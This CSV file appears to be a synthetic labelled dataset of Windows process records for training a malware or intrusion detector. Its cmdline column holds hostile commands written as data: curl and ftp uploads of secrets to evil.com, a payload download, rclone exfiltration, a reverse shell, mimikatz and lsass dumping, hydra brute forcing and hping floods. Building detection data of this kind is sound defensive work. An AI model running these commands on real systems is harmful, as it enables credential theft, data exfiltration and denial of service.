process_name,cmdline,cpu_usage,memory_usage,pid,ppid,has_network_activity,connection_count,is_system_user,label
chrome_update.exe,chrome_update.exe --no-ui,15.735271823031665,12.093275897181165,32710,2972,0,17,0,trojan
npm.exe,npm.exe,11.432724668934158,13.331681975147053,37821,9972,0,3,0,normal
explorer.exe,explorer.exe,6.197340261611306,4.134217299850336,35716,5748,0,15,0,normal
stress.exe,stress.exe --cpu 16 --flood,92.44165386161683,24.407973322401908,16370,5328,1,654,0,ddos
Discord.exe,Discord.exe,7.696150263114015,14.994196518765206,41555,1740,0,3,1,normal
MsMpEng.exe,MsMpEng.exe,2.6105118388078274,4.362185212479086,55562,6013,0,13,0,normal
Code.exe,Code.exe,43.643551856177446,15.567996142438396,18399,2919,0,2,0,normal
payload.exe,payload.exe --silent,23.550294387806048,22.735260945229,21777,6029,0,13,0,malware
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,35.65306975537839,27.456118317697467,51276,6497,0,17,0,privilege_escalation
node.exe,node.exe,83.80152861758586,21.456917511382375,35707,2011,0,1,0,normal
node.exe,node.exe,6.978706839867077,2.291798361855644,57079,2144,0,10,1,normal
Docker Desktop.exe,Docker Desktop.exe,38.673045288774894,3.2807371574962754,40761,1259,1,11,0,normal
printspoofer.exe,printspoofer.exe -i -c cmd,30.430366379433153,17.75086360703167,21821,2686,0,16,0,privilege_escalation
java.exe,java.exe,3.3836999435140513,10.047009999087585,44024,5137,1,14,1,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,87.28984505569309,20.840701144531938,58278,340,1,8,0,brute_force
npm.exe,npm.exe,75.58673750419155,17.252408065465982,27916,9949,1,9,0,normal
services.exe,services.exe,1.6764057615966106,0.5894763702002013,1935,166,0,15,0,normal
printspoofer.exe,printspoofer.exe -i -c cmd,22.41761118751919,18.676309789816262,40325,9346,0,2,0,privilege_escalation
Discord.exe,Discord.exe,1.6964107033686615,14.847760546498094,23730,2253,1,14,1,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,23.957556266111006,20.86681506632211,18113,704,0,16,0,privilege_escalation
ransom.exe,ransom.exe --encrypt --payment,71.1673423173629,14.324813845494118,36808,4801,1,6,0,ransomware
docker.exe,docker.exe,43.194722740800394,1.7712127173790142,26473,4437,1,3,1,normal
SearchIndexer.exe,SearchIndexer.exe,16.9780283902869,2.9545409632056683,39333,6195,0,5,0,normal
devenv.exe,devenv.exe,18.52130349382837,21.283347333363675,52341,8901,0,8,0,normal
SearchIndexer.exe,SearchIndexer.exe,13.88658020014185,1.3168099973262972,13965,2082,1,8,1,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,49.1922847729143,29.73633661258641,42381,4312,1,0,0,privilege_escalation
devenv.exe,devenv.exe,59.58737614695024,22.767410570854757,36282,7080,0,13,0,normal
MSBuild.exe,MSBuild.exe,79.89447472107942,5.181245827859977,3682,5353,1,2,0,normal
svchost.exe,svchost.exe,11.417939778318322,1.189257695323215,16110,7229,0,10,1,normal
System Idle Process,System Idle Process,84.8728550416935,0.09217450660492649,42094,5933,0,12,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,10.44551619713318,22.153608600247292,16668,504,0,12,0,data_exfiltration
chrome.exe,chrome.exe,30.40888916184625,10.076177638170627,45333,7364,0,6,1,normal
msedge.exe,msedge.exe,10.125741032530449,12.291354705125057,40471,3710,0,3,0,normal
cmd.exe,cmd.exe,27.032008931645898,2.9724096526375967,5581,5899,0,12,1,normal
ransom.exe,ransom.exe --encrypt --payment,85.90692852597736,24.314814311094814,3922,4542,1,12,0,ransomware
powershell.exe,powershell.exe,37.20154658507177,4.692781475812012,60041,5151,0,13,0,normal
python.exe,python.exe,59.24575720645937,3.8210555697656168,12442,53,0,6,1,normal
lsass.exe,lsass.exe,2.4145619977653077,0.5426012141178832,19605,5705,0,12,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,96.69980411494629,9.727393827193673,30100,750,1,0,0,brute_force
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,50.712341272784485,29.882303321264526,57231,905,1,3,0,brute_force
encrypt.exe,encrypt.exe --recursive C:\Users,87.94676817555283,7.947797922656745,28310,9615,0,12,0,ransomware
webpack.exe,webpack.exe,11.240964523481589,13.777687027788422,9829,7522,1,13,0,normal
update.exe,update.exe --silent --download http://evil.com/payload,32.9834918425036,18.97244556158312,12208,2719,0,6,0,trojan
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,39.92029742836624,11.208574930126554,46887,2824,1,389,0,brute_force
python3.exe,python3.exe,17.598452450852342,17.514051926474856,6154,8656,1,4,0,normal
Docker Desktop.exe,Docker Desktop.exe,5.755666426883819,2.8508144128600503,61652,501,1,7,0,normal
dwm.exe,dwm.exe,12.646689143860904,7.634390673188295,11399,2868,1,11,0,normal
lsass.exe,lsass.exe,0.7095086028888847,0.6272342976392472,44738,6117,1,10,0,normal
System,System,1.4649364425593148,0.07459920369318951,11925,9993,0,11,1,normal
lsass.exe,lsass.exe,2.270413455235692,0.2572656336043977,35055,6573,0,15,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,87.75009916753015,5.5140846649338195,31104,8491,0,20,0,brute_force
python3.exe,python3.exe,51.71587390667403,29.878806082627722,6694,8988,1,4,1,normal
lsass.exe,lsass.exe,0.2549711447163927,1.8877318982912026,39825,1420,0,13,1,normal
tsc.exe,tsc.exe,99.9687190569485,7.668948159538067,27272,9975,1,14,0,normal
backdoor.exe,backdoor.exe --persist,28.250684677885296,7.61556552840525,38697,9996,1,13,0,malware
mimikatz.exe,mimikatz.exe lsadump::sam,32.918867701176545,28.794662212958443,30716,6042,0,2,0,malware
WindowsTerminal.exe,WindowsTerminal.exe,12.701923150767355,9.769402826599046,28716,3394,0,7,0,normal
cmd.exe,cmd.exe,3.4409290336824547,2.9196389264380302,35000,1510,0,12,0,normal
Slack.exe,Slack.exe,7.2597663372237085,10.22741403936465,18385,5047,0,11,1,normal
python3.exe,python3.exe,12.639941456986092,28.17764969867878,46866,6721,1,0,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,11.075072343210023,20.879563852794625,20507,6940,0,5,0,data_exfiltration
tsc.exe,tsc.exe,66.71992330965874,8.358206208409367,51178,8682,0,15,1,normal
Teams.exe,Teams.exe,31.327981381727287,8.878429542632166,35030,605,1,7,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,33.85920895218935,26.830296511405685,12321,6654,0,18,0,data_exfiltration
WindowsTerminal.exe,WindowsTerminal.exe,12.769499248134933,9.858313007326634,19742,9682,0,6,0,normal
chrome.exe,chrome.exe,2.6675822693889026,15.841583495098572,58377,2208,0,15,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,21.027702163723866,13.031276718581587,46676,1076,0,9,0,data_exfiltration
msedge.exe,msedge.exe,21.988631653153966,14.698738330069869,59675,681,0,15,0,normal
payload.exe,payload.exe --silent,58.33359087403989,26.22727078783293,29733,2745,0,14,0,malware
python3.exe,python3.exe,68.23593488906022,24.24162080468205,8124,6012,0,11,0,normal
git.exe,git.exe,39.68000227743468,1.0553601466655937,15398,2608,1,6,0,normal
Teams.exe,Teams.exe,33.19232170829937,9.402279883420562,28095,9302,0,13,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,92.84888445316918,27.948626966799317,28708,963,0,20,0,brute_force
dwm.exe,dwm.exe,24.360961398256702,4.112330190211449,2392,5790,1,12,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,10.556574398635918,25.95997398204392,14603,8101,0,0,0,data_exfiltration
winpeas.exe,winpeas.exe,52.578133927416246,19.603692111254475,544,1527,1,7,0,privilege_escalation
powershell.exe,powershell.exe,5.512842188424512,2.0157790322281053,18405,2291,1,1,0,normal
firefox.exe,firefox.exe,35.52451091483785,5.492249151428313,28124,8628,0,6,0,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,32.80607097351799,5.910055671216731,20298,6015,0,6,0,brute_force
psexec.exe,psexec.exe \\target -s cmd.exe,32.284756471189944,25.23948904420129,37032,2250,0,7,0,privilege_escalation
Slack.exe,Slack.exe,18.92608273533102,6.0343887374926615,252,1824,0,10,1,normal
explorer.exe,explorer.exe,7.429449906473476,1.2511155613681977,37604,6240,1,6,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,11.68426783902606,13.189488988249392,26666,2627,0,0,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,20.08488260807973,25.17197812041879,50814,4219,1,2,0,data_exfiltration
msedge.exe,msedge.exe,42.89712101671509,14.445132872561711,14074,6161,0,5,0,normal
csrss.exe,csrss.exe,2.774657530293901,0.5095402308746021,17281,5692,1,12,0,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,30.32648191936636,7.920969535721799,16966,1468,1,2,0,brute_force
msedge.exe,msedge.exe,45.00326391787811,24.61819764553079,57029,940,0,4,0,normal
firefox.exe,firefox.exe,26.90747139674428,9.468097327140896,52157,4804,0,11,0,normal
Teams.exe,Teams.exe,29.404809660252287,4.538711220856988,32567,8186,0,5,1,normal
stress.exe,stress.exe --cpu 16 --flood,92.85781755643345,21.414993209991362,54765,6530,1,606,0,ddos
MSBuild.exe,MSBuild.exe,18.722584396359576,17.828934571603895,20801,7133,0,9,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,16.522328238959652,20.8974868260482,43315,8533,1,14,0,data_exfiltration
cmd.exe,cmd.exe,6.04281768449937,1.2503641145948976,39646,7308,0,13,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,99.90360274736285,10.621985202731283,23802,5138,0,3,0,ransomware
ftp.exe,ftp.exe -s:script.txt evil-server.com,27.606806157141676,28.123029425971236,61798,5703,1,20,0,data_exfiltration
webpack.exe,webpack.exe,18.383165133218714,7.388615936998814,43334,8439,0,13,1,normal
python3.exe,python3.exe,37.263900328565455,14.86270770532899,42154,2580,0,8,1,normal
locker.exe,locker.exe --wallet bc1qxy...,57.230373637254154,10.811004690423356,56108,7810,1,11,0,ransomware
backdoor.exe,backdoor.exe --persist,10.899639393145819,20.250073311169132,39329,9360,0,17,0,malware
OUTLOOK.EXE,OUTLOOK.EXE,29.486001524660487,14.887782664276918,17448,5437,0,5,1,normal
Code.exe,Code.exe,34.527383102694365,14.876901495996112,39792,473,0,9,0,normal
lsass.exe,lsass.exe,1.1748214753970199,1.1475875639245419,24041,5221,0,6,0,normal
mimikatz.exe,mimikatz.exe lsadump::sam,31.807420800549995,14.74337872400943,44084,6347,1,19,0,malware
java.exe,java.exe,16.305451136995487,16.5254186813811,58030,5963,0,8,0,normal
services.exe,services.exe,0.3703240921168294,0.4848053889390245,29278,5001,0,11,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,97.85101346257608,20.015645334583457,51123,7470,0,2,0,brute_force
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,68.43412314598334,21.228763273341144,36322,3890,1,16,0,malware
npm.exe,npm.exe,11.359427925301912,6.2924732991766215,44925,9615,0,3,0,normal
npm.exe,npm.exe,87.83433417799871,9.759286284975577,22190,1736,1,4,1,normal
cmd.exe,cmd.exe,11.188106816172102,1.8824402855459224,6065,7946,0,14,0,normal
explorer.exe,explorer.exe,1.3999848600986708,1.160750534857999,55465,3840,0,15,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,91.7324783839694,6.046590286113627,60608,7081,1,9,0,brute_force
python3.exe,python3.exe,59.90527038890696,14.30749996342043,56620,5323,1,14,0,normal
cryptor.exe,cryptor.exe -aes256 -all,90.75931333532947,8.247230171029722,4057,2482,0,3,0,ransomware
python3.exe,python3.exe,29.928628805551217,11.938333828686183,40419,9074,1,11,0,normal
System Idle Process,System Idle Process,80.25858753782231,0.09501435617113209,5379,5964,0,8,1,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,94.10419678534755,19.424269572798313,18377,7901,0,1,0,brute_force
MsMpEng.exe,MsMpEng.exe,65.78216341342133,6.015108583475756,20130,9291,0,11,0,normal
java.exe,java.exe,98.76046783788203,17.073807274297607,50491,2394,0,1,0,normal
webpack.exe,webpack.exe,55.64454822942647,13.61911732383483,22742,2101,0,12,1,normal
cryptor.exe,cryptor.exe -aes256 -all,70.3547498614238,28.850647911414676,7813,4440,0,10,0,ransomware
tsc.exe,tsc.exe,82.39391287934974,1.6795132392575156,5761,2309,0,2,0,normal
bash.exe,bash.exe,17.246121303268914,3.650898096122768,24471,770,0,8,1,normal
encrypt.exe,encrypt.exe --recursive C:\Users,88.28101001168491,24.30818119532517,50423,9893,0,12,0,ransomware
loic.exe,loic.exe --target 192.168.1.1,78.58602651352169,19.012793576090722,17728,9158,1,957,0,ddos
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,60.00857257865183,20.00028171292113,14850,1093,0,8,0,brute_force
System,System,2.6417095831595736,0.46631551968647494,49907,8380,0,11,0,normal
Slack.exe,Slack.exe,4.993961981914707,6.524507106988988,24790,2478,0,3,0,normal
lsass.exe,lsass.exe,1.0839720817622038,1.724377543096886,40735,5292,1,8,0,normal
npm.exe,npm.exe,40.7093037208186,6.06778012798203,54973,1630,0,1,0,normal
Docker Desktop.exe,Docker Desktop.exe,11.156014969746316,10.809363444164703,15761,4814,0,7,0,normal
cmd.exe,cmd.exe,27.461339124402464,0.6481362700101192,63109,3877,1,0,1,normal
MSBuild.exe,MSBuild.exe,46.423374310088214,14.066905215336801,41528,1287,0,8,1,normal
docker.exe,docker.exe,34.37025688251039,4.362098233516862,61164,477,0,12,1,normal
svchost.exe,svchost.exe,5.389100724300378,1.2882079353988036,49238,5924,0,6,1,normal
firefox.exe,firefox.exe,31.146951581801464,23.96491153595503,23618,167,0,1,0,normal
Teams.exe,Teams.exe,17.49574654211714,12.37633728917019,59314,6007,1,0,1,normal
npm.exe,npm.exe,38.319772136749386,8.599620946219037,60060,1057,0,0,0,normal
System,System,1.6599591732559438,0.04893696499351219,1506,2364,0,6,0,normal
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,52.651257968585085,26.98001280950152,30317,7277,0,4,0,malware
Code.exe,Code.exe,36.6207503457572,3.159910265751231,14785,8697,1,13,1,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,16.692637659434645,14.182379837962182,34424,4962,1,6,0,trojan
lsass.exe,lsass.exe,4.353674824279013,1.7162184021057332,28794,9721,0,15,1,normal
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,53.45393677502998,29.596184292100137,2728,8763,0,5,0,privilege_escalation
git.exe,git.exe,9.781766936242198,1.92794933965455,2082,9481,1,2,1,normal
OUTLOOK.EXE,OUTLOOK.EXE,22.326454295699392,9.683720077038926,45514,6007,0,9,0,normal
System,System,4.56702124652307,0.2959227135184765,49792,7942,1,14,1,normal
cmd.exe,cmd.exe,4.623416782332094,0.7905818738897937,38588,4086,0,14,1,normal
SearchIndexer.exe,SearchIndexer.exe,5.0022569854066905,1.2786316342466058,38002,4043,0,11,0,normal
System Idle Process,System Idle Process,90.64626812220787,0.0013690790048883072,9945,9769,0,13,0,normal
npm.exe,npm.exe,29.96734751000919,13.37118126780339,19524,8346,0,1,1,normal
chrome_update.exe,chrome_update.exe --no-ui,13.692201370787895,13.483870229511975,4472,9351,1,13,0,trojan
Discord.exe,Discord.exe,14.078811782104001,7.893118243361162,4835,4030,0,0,0,normal
docker.exe,docker.exe,41.91288394292766,7.758916729218444,63974,5466,0,7,1,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,90.66127643984288,26.025587965547928,53269,4120,1,7,0,brute_force
bash.exe,bash.exe,0.16798365436751395,2.231873196737518,2542,381,0,9,0,normal
webpack.exe,webpack.exe,51.59902266286222,16.557502422975745,48340,6374,0,0,1,normal
Code.exe,Code.exe,9.453803082427648,12.265168049201266,14091,4505,0,1,0,normal
hping.exe,hping.exe --flood -p 80 target.com,96.75309722286076,24.28084976080133,22808,877,1,4118,0,ddos
encrypt.exe,encrypt.exe --recursive C:\Users,85.01224260623735,24.406470379228352,18040,8899,1,10,0,ransomware
firefox.exe,firefox.exe,41.99986252738976,2.5834848621913373,29652,2433,0,11,1,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,58.19639095315013,18.30080544805508,7241,7088,0,1,0,data_exfiltration
Discord.exe,Discord.exe,19.709501591988786,11.964841428666784,48839,7708,0,0,1,normal
powershell.exe,powershell.exe,16.726766776191603,6.429127982834916,8630,1991,0,11,1,normal
backdoor.exe,backdoor.exe --persist,14.403107926897405,6.531267554769341,17743,2430,0,18,0,malware
Slack.exe,Slack.exe,8.594273620612944,3.075447787514608,45696,2898,1,11,1,normal
svchosts.exe,svchosts.exe -connect evil.com,28.5351806183736,26.236206598536256,53957,9391,1,7,0,malware
csrss.exe,csrss.exe,2.4646545530568584,0.18036534010134558,16565,5578,0,0,0,normal
cmd.exe,cmd.exe,5.659594951750772,1.8648149293676315,13772,9295,1,9,0,normal
wsl.exe,wsl.exe,21.69365149318143,5.190128785166607,10900,8477,0,15,1,normal
explorer.exe,explorer.exe,1.9736400596178105,1.0747541596920862,40311,5533,1,3,0,normal
npm.exe,npm.exe,42.368608791391395,16.622466093834845,53704,8455,0,7,1,normal
chrome.exe,chrome.exe,57.45758619870731,8.978868414970878,59331,4333,0,13,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,15.60469493948353,7.589159990808605,50967,7554,0,1,1,normal
MSBuild.exe,MSBuild.exe,18.54484611903121,8.431111936541216,8807,727,0,15,0,normal
MSBuild.exe,MSBuild.exe,41.63028841721271,8.425599019729281,49823,3057,0,6,1,normal
backdoor.exe,backdoor.exe --persist,8.128062083327901,26.561182829141273,1226,9727,1,20,0,malware
OUTLOOK.EXE,OUTLOOK.EXE,3.262109233666759,10.927322902070356,64212,5224,1,8,0,normal
hping.exe,hping.exe --flood -p 80 target.com,82.1462211844111,14.418728471899318,5925,4774,1,1967,0,ddos
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,9.251070620861217,21.59529699892782,32266,6036,1,9,0,data_exfiltration
Teams.exe,Teams.exe,20.42611457246567,13.360266263803476,594,4380,0,6,0,normal
bash.exe,bash.exe,21.157031263895966,4.346209217946326,39410,4060,0,13,0,normal
hping.exe,hping.exe --flood -p 80 target.com,87.13497302327431,25.424661761843858,28876,302,1,4633,0,ddos
stress.exe,stress.exe --cpu 16 --flood,96.18429319204124,11.731012641799563,53677,9027,1,317,0,ddos
docker.exe,docker.exe,25.5890986959241,5.8665796174970515,33644,8432,0,3,0,normal
firefox.exe,firefox.exe,3.8498281974902504,12.235186700995389,32108,4881,0,6,0,normal
node.exe,node.exe,97.72333221126982,19.977249046746348,14028,1919,0,11,1,normal
services.exe,services.exe,0.778539369311223,0.3244239867021536,36988,42,0,6,0,normal
psexec.exe,psexec.exe \\target -s cmd.exe,16.301274468480738,23.663992648909,20750,1961,0,1,0,privilege_escalation
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,86.82354373429649,24.73622878031629,1187,8905,0,5,0,brute_force
npm.exe,npm.exe,93.90374737277293,11.75969475162468,41833,7047,0,8,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,21.853993294667575,1.7758166965284623,41963,5210,0,13,1,normal
java.exe,java.exe,26.041975451088305,6.183393319896125,6945,5333,0,15,1,normal
cryptor.exe,cryptor.exe -aes256 -all,71.33903916594303,20.910685262628355,24705,6180,0,1,0,ransomware
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,49.501157399872085,12.97357513888346,9597,3984,0,5,0,privilege_escalation
svchost.exe,svchost.exe -connect 185.141.62.123:443,14.304241238949688,8.087501210108776,6703,7128,1,16,0,trojan
bash.exe,bash.exe,57.45116622642955,3.8390965414590217,64777,4761,0,15,1,normal
WindowsTerminal.exe,WindowsTerminal.exe,5.771643528309861,2.1157434417159666,45455,915,1,9,0,normal
Code.exe,Code.exe,31.41537436357902,17.71303442065185,26863,5460,0,4,0,normal
SearchIndexer.exe,SearchIndexer.exe,15.66636984361855,1.375144240898944,39495,6096,0,11,1,normal
System Idle Process,System Idle Process,93.40163724843552,0.02617693338223791,45782,3021,1,2,0,normal
webpack.exe,webpack.exe,21.28256540127159,10.007498015826338,21754,6972,1,1,0,normal
cmd.exe,cmd.exe,22.37044072691956,0.13384348157774845,61578,6138,0,2,0,normal
webpack.exe,webpack.exe,37.690222136517235,9.33003907912712,22889,4456,1,13,0,normal
explorer.exe,explorer.exe,6.069833378472088,1.8342226341825683,26715,3537,0,0,1,normal
powershell.exe,powershell.exe,53.55984543108593,8.141017194941668,64169,8460,0,12,1,normal
csrss.exe,csrss.exe,0.29323837543902853,0.35353051437118554,14596,4214,0,5,0,normal
msedge.exe,msedge.exe,53.0528625168092,3.5068796210576747,18913,1186,0,9,1,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,21.938048664131557,27.19837094718392,59124,4683,0,20,0,data_exfiltration
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,63.13090399906939,18.880153072544616,47975,2989,0,7,0,malware
svchost.exe,svchost.exe,12.72610409937405,0.7979445735348465,36916,2004,0,4,1,normal
update.exe,update.exe --silent --download http://evil.com/payload,21.289512432602628,16.646059420076938,20845,5716,0,3,0,trojan
payload.exe,payload.exe --silent,42.611967370227006,16.866591078943507,2177,6550,1,9,0,malware
lsass.exe,lsass.exe,4.851887578245357,1.1549921538403978,47508,6368,0,8,0,normal
chrome.exe,chrome.exe,50.91498573267122,29.94379319213057,25991,3228,0,15,0,normal
loic.exe,loic.exe --target 192.168.1.1,94.4174352886127,28.645253402902526,23581,1783,1,928,0,ddos
devenv.exe,devenv.exe,33.46045776733746,17.820200218002213,51001,2045,0,10,1,normal
msedge.exe,msedge.exe,45.55422793836894,24.067573666072796,32994,3136,0,6,1,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,63.26318593648875,16.956345979082727,35125,6431,1,2,0,brute_force
Code.exe,Code.exe,3.4548910090350438,2.192386776815148,47877,6197,0,8,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,17.718439594265625,18.970145686168912,38101,9358,0,5,0,trojan
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,48.68914001678523,27.377936600552694,61818,9061,0,7,0,privilege_escalation
chrome.exe,chrome.exe,49.188389962444894,20.149134371137908,22641,4374,0,8,0,normal
services.exe,services.exe,1.2958521148158781,0.7386342024240893,46577,8979,1,13,0,normal
MsMpEng.exe,MsMpEng.exe,49.531043442478804,3.3757125458826325,47166,3367,0,9,0,normal
mimikatz.exe,mimikatz.exe lsadump::sam,26.858069509414587,5.488733229758939,38630,2116,0,4,0,malware
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,23.503938322051283,19.146568246753205,58821,9371,1,3,0,trojan
bash.exe,bash.exe,51.91031049967521,4.154928572761247,2305,2117,0,8,0,normal
tsc.exe,tsc.exe,23.167390219147233,5.017533113511807,2374,8952,0,1,1,normal
docker.exe,docker.exe,3.768963239281309,4.867071757067281,12859,8245,1,8,1,normal
chrome_update.exe,chrome_update.exe --no-ui,25.234643287419672,8.363508612702068,1714,3676,1,9,0,trojan
chrome.exe,chrome.exe,65.70937018320532,10.11828466592468,2397,1680,0,9,0,normal
Code.exe,Code.exe,44.145073680437804,5.918018490521414,62027,2855,0,13,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,11.663265591593708,13.252653949807451,26688,8642,1,3,1,normal
wsl.exe,wsl.exe,43.887629982268756,7.325065584675027,40103,3157,0,2,0,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,15.530746313715511,20.263086952899076,40242,1751,1,0,0,trojan
explorer.exe,explorer.exe,8.648571899436432,2.399812307134712,12114,2616,0,7,0,normal
services.exe,services.exe,1.2840247919183967,0.441839004896343,21695,3723,0,5,1,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,64.42709896748059,12.906599592861152,11694,5389,1,483,0,brute_force
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,57.9234457516489,8.28712766494542,171,8736,1,51,0,brute_force
loic.exe,loic.exe --target 192.168.1.1,88.10730865563406,17.18176689918515,55752,9156,1,1496,0,ddos
webpack.exe,webpack.exe,15.383710102602521,15.30369075924728,42640,6209,0,3,0,normal
npm.exe,npm.exe,82.32785044613064,8.947342338535929,24735,3260,0,11,1,normal
MsMpEng.exe,MsMpEng.exe,38.19975788407211,2.0320557232783774,772,2264,0,9,1,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,53.41401879058263,7.388644905355858,1465,5882,0,4,0,data_exfiltration
python.exe,python.exe,42.23568395629916,23.771232762717055,23545,9428,0,3,1,normal
explorer.exe,explorer.exe,0.09735246128675601,2.6537979766762483,7878,8194,0,10,0,normal
Slack.exe,Slack.exe,7.048131198373908,8.686487983677672,1832,5371,0,1,0,normal
dwm.exe,dwm.exe,10.320867345629884,4.335307452091388,43269,6916,0,0,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,8.915766905960684,4.351858600774061,37330,922,0,8,1,normal
docker.exe,docker.exe,30.613408106375772,4.997279172785446,6625,4514,0,11,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,9.34315986663708,3.5198148565894796,48853,6797,0,15,1,normal
payload.exe,payload.exe --silent,70.44519547668548,21.844399832504898,14685,716,1,10,0,malware
java.exe,java.exe,74.33194707754322,6.58762184543515,54522,4168,0,4,1,normal
Teams.exe,Teams.exe,19.889192906049292,13.477413203128783,21984,4093,0,8,1,normal
ransom.exe,ransom.exe --encrypt --payment,83.47309395383158,23.551760262825308,61720,7568,1,15,0,ransomware
python.exe,python.exe,73.32591828032679,7.856123422259349,21677,697,0,4,0,normal
wsl.exe,wsl.exe,49.92521024207301,7.268559963559334,24616,220,0,9,1,normal
lsass.exe,lsass.exe,2.0008837773101606,0.6036662344184637,38939,8343,0,2,0,normal
mimikatz.exe,mimikatz.exe lsadump::sam,30.335827727430562,20.252587743205407,40367,6682,0,14,0,malware
devenv.exe,devenv.exe,57.860594361159734,24.92624475073137,51825,3756,1,2,0,normal
tsc.exe,tsc.exe,6.52646025377247,7.8265697661199685,40520,6103,0,5,0,normal
powershell.exe,powershell.exe,30.233113517949807,6.856440777793413,49528,8113,0,4,0,normal
MsMpEng.exe,MsMpEng.exe,64.27514961917412,9.580702141304934,23029,6507,0,4,0,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,20.489069889076806,14.170308011271594,10966,1476,1,6,0,trojan
webpack.exe,webpack.exe,2.125194216905446,16.970843358937785,8976,5542,1,7,1,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,18.22577082819109,19.0556902347058,17631,352,1,6,0,data_exfiltration
devenv.exe,devenv.exe,28.34698494299363,20.83852819141285,37063,6704,0,14,1,normal
services.exe,services.exe,1.2818308887788987,0.36786712676070865,5933,1074,0,3,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,39.308919514114876,10.083457581181325,53514,7675,0,18,0,data_exfiltration
hping.exe,hping.exe --flood -p 80 target.com,86.84368386793513,9.54062466947298,64438,96,1,914,0,ddos
payload.exe,payload.exe --silent,48.68219268949244,26.466079231838318,55027,7877,0,9,0,malware
OUTLOOK.EXE,OUTLOOK.EXE,5.004205669677717,4.096319197505919,14412,6585,0,1,0,normal
Discord.exe,Discord.exe,24.366296036384824,12.318429478426904,35386,1633,0,6,1,normal
printspoofer.exe,printspoofer.exe -i -c cmd,42.985757559039314,7.175192647513538,24859,3944,1,6,0,privilege_escalation
MSBuild.exe,MSBuild.exe,0.5209084194012892,7.02113535179164,53887,2189,0,0,0,normal
